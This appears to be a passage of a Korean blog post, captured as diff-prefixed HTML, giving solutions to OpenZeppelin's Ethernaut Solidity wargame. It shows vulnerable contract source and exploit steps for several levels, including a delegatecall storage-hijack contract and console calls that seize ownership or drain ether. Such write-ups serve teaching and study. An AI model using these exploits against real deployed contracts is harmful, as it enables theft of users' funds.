timeZone2Library; // slot 1  address public owner; // slot 2  uint storedTime; // slot 3  // Sets the function signature for delegatecall  bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\")); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public { timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; } // set the time for timezone 1  function setFirstTime(uint _timeStamp) public { timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); } // set the time for timezone 2  function setSecondTime(uint _timeStamp) public { timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); } } // Simple library contract to set the time contract LibraryContract { // stores a timestamp  uint storedTime; // slot 0  function setTime(uint _time) public { storedTime = _time; } } Preservation 컨트랙트는 constructor() 에서 setTime() 함수를 포함하고 있는 2개의 timeZomeLibrary 컨트랙트 주소를 입력받는다.\nsetFirstTime() 호출 시, 첫번째 timeZone1Library::setTime()을 delegatecall()로 호출하여 인자로 전달된 타임스탬프 값을 설정하고, setSecondTime() 호출 시, 두번째 timeZone2Library::setTime()을 delegatecall()로 호출하여 인자로 전달된 타임스탬프 값을 설정한다.\n위 컨트랙트의 owner 값을 player 주소로 변경해야 한다.\nExploit delegatecall()로 인해, caller인 Preservation() 컨트랙트의 storage 영역이 변경된다.\n 개발자의 의도는 각 함수/인자 전달을 통해 callee인 LibraryContract 컨트랙트의 uint storedTime을 변경하는 것  (1) [slot 0] address public timeZone1Library 변경\n 첫번째 setFirstTime() 호출 시, LibraryContract::storedTime(slot 0)가 아닌 Preservation::timeZone1Library(slot 0)이 변경된다. 이 때 공격자가 개발한 컨트랙트의 주소를 전달하여, 이후 setFirstTime()을 통해 호출되는 delegatecall()을 공격자의 컨트랙트로 보낼 수 있다.  (2) [slot 2] address public owner 변경\n 두번째 setFirstTime() 호출 시, delegatecall()로 공격자가 개발한 컨트랙트의 setTime()을 호출하게 된다. 공격자 컨트랙트의 setTime()은 Preservation::owner(slot 2)를 변경하는 코드로 구성하면 된다.  // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; interface IPreservation { function setFirstTime(uint _timeStamp) external; } contract LibraryContractHook { address slot0; address slot1; address slot2_owner; function setTime(uint _time) public { //owner = address(_time);  slot2_owner = address(uint160(_time)); } } contract PreservationExploit { address target; LibraryContractHook hookLibrary; address attackerEOA; constructor (address _preservation) public { target = _preservation; hookLibrary = new LibraryContractHook(); attackerEOA = msg.sender; } // run twice?  function exploit() public { IPreservation(target).setFirstTime(uint256(address(hookLibrary))); IPreservation(target).setFirstTime(uint256(attackerEOA)); } }  await contract.timeZone1Library(); '0x7Dc17e761933D24F4917EF373F6433d4a62fe3c5'  await contract.timeZone2Library(); '0xeA0De41EfafA05e2A54d1cD3ec8CE154b1Bb78F1'  await contract.owner(); '0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F' // LibraryContractHook Deploy  // PreservationExploit Deploy \u0026 call exploit()  await contract.timeZone1Library(); '0x67FeC8C9Ae98D7cfeeD4ef05F3E7c3A432AB59Ed' await contract.timeZone2Library(); '0xeA0De41EfafA05e2A54d1cD3ec8CE154b1Bb78F1' await contract.owner(); '0x--------------AttackerEOA---------------' // Submit # 17. Recovery Summary // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Recovery { //generate tokens  function generateToken(string memory _name, uint256 _initialSupply) public { new SimpleToken(_name, msg.sender, _initialSupply); } } contract SimpleToken { using SafeMath for uint256; // public variables  string public name; mapping (address = uint) public balances; // constructor  constructor(string memory _name, address _creator, uint256 _initialSupply) public { name = _name; balances[_creator] = _initialSupply; } // collect ether in return for tokens  receive() external payable { balances[msg.sender] = msg.value.mul(10); } // allow transfers of tokens  function transfer(address _to, uint _amount) public { require(balances[msg.sender] = _amount); balances[msg.sender] = balances[msg.sender].sub(_amount); balances[_to] = _amount; } // clean up after ourselves  function destroy(address payable _to) public { selfdestruct(_to); } } Recovery 컨트랙트는 SimpleToken 컨트랙트를 이용해 토큰을 생성했고, 해당 SimpleToken 컨트랙트는 receive() 함수를 통해 받은 ether * 10의 토큰을 반환해준다.\n배포자는 SimpleToken에 0.001 ether를 보낸 후, 해당 컨트랙트의 주소를 잃어버린 상황이다.\n이 상황에서 해당 주소로부터 0.001 ether를 찾아와야 한다.\nExploit Get new instance를 통해 배포한 Recovery 컨트랙트를 Rinkeby Etherscan에서 검색한다.\n해당 컨트랙트의 Internal Txns의 탭 내용 중 To가 Contract Creation인 Txn을 확인할 수 있다.\nContract Creation을 클릭하면, Recovery 컨트랙트에 의해 생성된 SimpleToken 컨트랙트를 확인할 수 있다.\nSimpleToken의 Internal Txns를 보면, 해당 컨트랙트로 0.001 ether가 송신된 Txn을 찾을 수 있다. (이 때 From은 Ethernaut의 Level Address)\n이후 아래와 같이, 대상 컨트랙트에 트랜잭션을 전송하여 destroy() 함수를 호출하면 된다.\n selfdestruct(_to)를 통해 컨트랙트 destruct 후, 컨트랙트가 가진 잔고는 인자로 전달된 _to 로 전송   let simpletoken = \"[SimpleToken Contract Address]\";  await getBalance(simpletoken); '0.001'  let payload = web3.eth.abi.encodeFunctionCall({ name: 'destroy', type: 'function', inputs: [{ type: 'address', name: '_to' }] }, [player]); '0x00f55d9d000000000000000000000000446e7871f0be73127feebdb959d49864043ef525'  await sendTransaction({from: player, to:simpletoken, data: payload})  await getBalance(simpletoken); '0' ",
+  "wordCount" : "3723",
+  "inLanguage": "kr",
+  "datePublished": "2022-01-26T00:00:00Z",
+  "dateModified": "2022-01-26T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "inhack"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://inhack.github.io/kr/posts/solution-ethernaut/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "inhack",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://inhack.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://inhack.github.io/kr/" accesskey="h" title="inhack (Alt + H)">inhack</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                    <li>
+                        <a href="https://inhack.github.io/" title="En"
+                            aria-label="En">En</a>
+                    </li>
+                </ul>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://inhack.github.io/kr/archives/" title="아카이브">
+                    <span>아카이브</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://inhack.github.io/kr/search" title="검색">
+                    <span>검색</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://inhack.github.io/kr/categories/" title="카테고리">
+                    <span>카테고리</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://inhack.github.io/kr/tags/" title="태그">
+                    <span>태그</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://inhack.github.io/kr/">Home</a>&nbsp;»&nbsp;<a href="https://inhack.github.io/kr/posts/">Posts</a></div>
+    <h1 class="post-title">
+      [Solution] Ethernaut
+    </h1>
+    <div class="post-description">
+      Ethernaut(The Web3/Solidity based wargame of Openzeppelin) Solutions
+    </div>
+    <div class="post-meta"><span title='2022-01-26 00:00:00 +0000 UTC'>January 26, 2022</span>&nbsp;·&nbsp;18 min&nbsp;·&nbsp;inhack&nbsp;|&nbsp;
+<ul class="i18n_list">Translations:
+    <li>
+        <a href="https://inhack.github.io/posts/solution-ethernaut/">En</a>
+    </li>
+</ul>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#-0-hello-ethernaut" aria-label="# 0. Hello Ethernaut"># 0. Hello Ethernaut</a></li>
+                <li>
+                    <a href="#-1-fallback" aria-label="# 1. Fallback"># 1. Fallback</a><ul>
+                        
+                <li>
+                    <a href="#summary" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-2-fallout" aria-label="# 2. Fallout"># 2. Fallout</a><ul>
+                        
+                <li>
+                    <a href="#summary-1" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-1" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-3-coin-flip" aria-label="# 3. Coin Flip"># 3. Coin Flip</a><ul>
+                        
+                <li>
+                    <a href="#summary-2" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-2" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-4-telephone" aria-label="# 4. Telephone"># 4. Telephone</a><ul>
+                        
+                <li>
+                    <a href="#summary-3" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-3" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-5-token" aria-label="# 5. Token"># 5. Token</a><ul>
+                        
+                <li>
+                    <a href="#summary-4" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-4" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-6-delegation" aria-label="# 6. Delegation"># 6. Delegation</a><ul>
+                        
+                <li>
+                    <a href="#summary-5" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-5" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-7-force" aria-label="# 7. Force"># 7. Force</a><ul>
+                        
+                <li>
+                    <a href="#summary-6" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-6" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-8-vault" aria-label="# 8. Vault"># 8. Vault</a><ul>
+                        
+                <li>
+                    <a href="#summary-7" aria-label="summary">summary</a></li>
+                <li>
+                    <a href="#exploit-7" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-9-king" aria-label="# 9. King"># 9. King</a><ul>
+                        
+                <li>
+                    <a href="#summary-8" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-8" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-10-re-entrancy" aria-label="# 10. Re-entrancy"># 10. Re-entrancy</a><ul>
+                        
+                <li>
+                    <a href="#summary-9" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-9" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-11-elevator" aria-label="# 11. Elevator"># 11. Elevator</a><ul>
+                        
+                <li>
+                    <a href="#summary-10" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-10" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-12-privacy" aria-label="# 12. Privacy"># 12. Privacy</a><ul>
+                        
+                <li>
+                    <a href="#summary-11" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-11" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-13-gatekeeper-one" aria-label="# 13. Gatekeeper One"># 13. Gatekeeper One</a><ul>
+                        
+                <li>
+                    <a href="#summary-12" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-12" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-14-gatekeeper-two" aria-label="# 14. Gatekeeper Two"># 14. Gatekeeper Two</a><ul>
+                        
+                <li>
+                    <a href="#summary-13" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-13" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-15-naught-coin" aria-label="# 15. Naught Coin"># 15. Naught Coin</a><ul>
+                        
+                <li>
+                    <a href="#summary-14" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-14" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-16-preservation" aria-label="# 16. Preservation"># 16. Preservation</a><ul>
+                        
+                <li>
+                    <a href="#summary-15" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-15" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-17-recovery" aria-label="# 17. Recovery"># 17. Recovery</a><ul>
+                        
+                <li>
+                    <a href="#summary-16" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-16" aria-label="Exploit">Exploit</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><hr>
+<p><a href="https://ethernaut.openzeppelin.com/"><strong><em>&lsquo;Ethernaut&rsquo;</em></strong></a> is a Web3/Solidity based wargame inspired on overthewire.org.</p>
+<p>This article offers a brief summary and exploit code of each challenge.</p>
+<hr>
+<h2 id="-0-hello-ethernaut"># 0. Hello Ethernaut<a hidden class="anchor" aria-hidden="true" href="#-0-hello-ethernaut">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">info</span>()
+<span style="color:#e6db74">&#39;You will find what you need in info1().&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">info1</span>();
+<span style="color:#e6db74">&#39;Try info2(), but with &#34;hello&#34; as a parameter.&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">info2</span>(<span style="color:#e6db74">&#34;hello&#34;</span>);
+<span style="color:#e6db74">&#39;The property infoNum holds the number of the next info method to call.&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">infoNum</span>();
+<span style="color:#a6e22e">o</span> {<span style="color:#a6e22e">negative</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">words</span><span style="color:#f92672">:</span> Array(<span style="color:#ae81ff">2</span>), <span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">red</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>}
+<span style="color:#a6e22e">length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+<span style="color:#a6e22e">negative</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
+<span style="color:#a6e22e">red</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>
+<span style="color:#a6e22e">words</span><span style="color:#f92672">:</span> (<span style="color:#ae81ff">2</span>) [<span style="color:#ae81ff">42</span>, <span style="color:#a6e22e">empty</span>]
+[[<span style="color:#a6e22e">Prototype</span>]]<span style="color:#f92672">:</span> Object
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">info42</span>();
+<span style="color:#e6db74">&#39;theMethodName is the name of the next method.&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">theMethodName</span>();
+<span style="color:#e6db74">&#39;The method name is method7123949.&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">method7123949</span>();
+<span style="color:#e6db74">&#39;If you know the password, submit it to authenticate().&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">password</span>();
+<span style="color:#e6db74">&#39;ethernaut0&#39;</span>
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">authenticate</span>(<span style="color:#e6db74">&#34;ethernaut0&#34;</span>);
+
+<span style="color:#75715e">// Submit
+</span></code></pre></div><hr>
+<h2 id="-1-fallback"># 1. Fallback<a hidden class="anchor" aria-hidden="true" href="#-1-fallback">#</a></h2>
+<h3 id="summary">Summary<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Fallback</span> {
+
+  <span style="color:#f92672">using</span> SafeMath <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">uint256</span>;
+  <span style="color:#66d9ef">mapping</span>(<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint</span>) <span style="color:#66d9ef">public</span> contributions;
+  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> owner;
+
+  <span style="color:#66d9ef">constructor</span>() <span style="color:#66d9ef">public</span> {
+    owner <span style="color:#f92672">=</span> msg.sender;
+    contributions[msg.sender] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">ether</span>);
+  }
+
+  <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">onlyOwner</span> {
+        require(
+            msg.sender <span style="color:#f92672">==</span> owner,
+            <span style="color:#e6db74">&#34;caller is not the owner&#34;</span>
+        );
+        <span style="color:#66d9ef">_</span>;
+    }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">contribute</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+    require(msg.value <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> <span style="color:#66d9ef">ether</span>);
+    contributions[msg.sender] <span style="color:#f92672">+=</span> msg.value;
+    <span style="color:#66d9ef">if</span>(contributions[msg.sender] <span style="color:#f92672">&gt;</span> contributions[owner]) {
+      owner <span style="color:#f92672">=</span> msg.sender;
+    }
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getContribution</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint</span>) {
+    <span style="color:#66d9ef">return</span> contributions[msg.sender];
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>() <span style="color:#66d9ef">public</span> onlyOwner {
+    owner.transfer(<span style="color:#66d9ef">address</span>(this).balance);
+  }
+
+  receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {                                  <span style="color:#75715e">// Vulnerable!
+</span><span style="color:#75715e"></span>    require(msg.value <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> contributions[msg.sender] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>);        
+    owner <span style="color:#f92672">=</span> msg.sender;
+  }
+}
+</code></pre></div><p>대상 컨트랙트의 ownership을 가져오는 것이 목표이다.</p>
+<p>컨트랙트를 배포한 owner의 contributions 금액은 1000 Ether로 초기화되어 있으며, <code>contribute()</code> 함수만 본다면 해당 금액 이상의 contribute를 해야 컨트랙트의 owner가 될 수 있다.
+(1000 Ether도 없을 뿐더러, 한번 contribute 실행시마다 0.001 Ether씩만 보낼 수 있다.)</p>
+<p>컨트랙트에서 Ether를 송금받기 위해 존재하는 receive() 함수에 취약점이 존재한다. contribute를 한 사용자가 receive() 함수를 실행 시에 owner가 될 수 있도록 코드가 작성되어 있다.</p>
+<h3 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">getContribution</span>();
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">contribute</span>({<span style="color:#a6e22e">from</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">player</span>, <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">toWei</span>(<span style="color:#e6db74">&#34;0.0001&#34;</span>)});
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sendTransaction</span>({<span style="color:#a6e22e">from</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">player</span>, <span style="color:#a6e22e">to</span><span style="color:#f92672">:</span><span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">toWei</span>(<span style="color:#e6db74">&#34;0.0001&#34;</span>)});
+
+<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">withdraw</span>();
+
+<span style="color:#75715e">// Submit
+</span></code></pre></div><hr>
+<h2 id="-2-fallout"># 2. Fallout<a hidden class="anchor" aria-hidden="true" href="#-2-fallout">#</a></h2>
+<h3 id="summary-1">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-1">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Fallout</span> {
+  
+  <span style="color:#f92672">using</span> SafeMath <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">uint256</span>;
+  <span style="color:#66d9ef">mapping</span> (<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint</span>) allocations;
+  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> owner;
+
+
+  <span style="color:#75715e">/* constructor */</span>
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Fal1out</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {       <span style="color:#75715e">// constructor function name typing mistake
+</span><span style="color:#75715e"></span>    owner <span style="color:#f92672">=</span> msg.sender;
+    allocations[owner] <span style="color:#f92672">=</span> msg.value;
+  }
+
+  <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">onlyOwner</span> {
+	        require(
+	            msg.sender <span style="color:#f92672">==</span> owner,
+	            <span style="color:#e6db74">&#34;caller is not the owner&#34;</span>
+	        );
+	        <span style="color:#66d9ef">_</span>;
+	    }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">allocate</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+    allocations[msg.sender] <span style="color:#f92672">=</span> allocations[msg.sender].add(msg.value);
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sendAllocation</span>(<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> allocator) <span style="color:#66d9ef">public</span> {
+    require(allocations[allocator] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>);
+    allocator.transfer(allocations[allocator]);
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">collectAllocations</span>() <span style="color:#66d9ef">public</span> onlyOwner {
+    msg.sender.transfer(<span style="color:#66d9ef">address</span>(this).balance);
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">allocatorBalance</span>(<span style="color:#66d9ef">address</span> allocator) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint</span>) {
+    <span style="color:#66d9ef">return</span> allocations[allocator];
+  }
+}
+</code></pre></div><p>마찬가지로 대상 컨트랙트의 ownership을 가져오는 것이 목표이다.</p>
+<p>constuctor 주석이 가리키는 Fal1out()을 호출하면 된다.</p>
+<h3 id="exploit-1">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-1">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">Fal1out</span>({<span style="color:#a6e22e">from</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">player</span>, <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">toWei</span>(<span style="color:#e6db74">&#34;0.000000000000000001&#34;</span>)}); <span style="color:#75715e">// 1 wei
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// Submit
+</span></code></pre></div><hr>
+<h2 id="-3-coin-flip"># 3. Coin Flip<a hidden class="anchor" aria-hidden="true" href="#-3-coin-flip">#</a></h2>
+<h3 id="summary-2">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-2">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">CoinFlip</span> {
+
+  <span style="color:#f92672">using</span> SafeMath <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">uint256</span>;
+  <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">public</span> consecutiveWins;
+  <span style="color:#66d9ef">uint256</span> lastHash;
+  <span style="color:#66d9ef">uint256</span> FACTOR <span style="color:#f92672">=</span> <span style="color:#ae81ff">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
+
+  <span style="color:#66d9ef">constructor</span>() <span style="color:#66d9ef">public</span> {
+    consecutiveWins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  }
+
+  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flip</span>(<span style="color:#66d9ef">bool</span> _guess) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>) {
+    <span style="color:#66d9ef">uint256</span> blockValue <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint256</span>(blockhash(block.number.sub(<span style="color:#ae81ff">1</span>)));
+
+    <span style="color:#66d9ef">if</span> (lastHash <span style="color:#f92672">==</span> blockValue) {
+      revert();
+    }
+
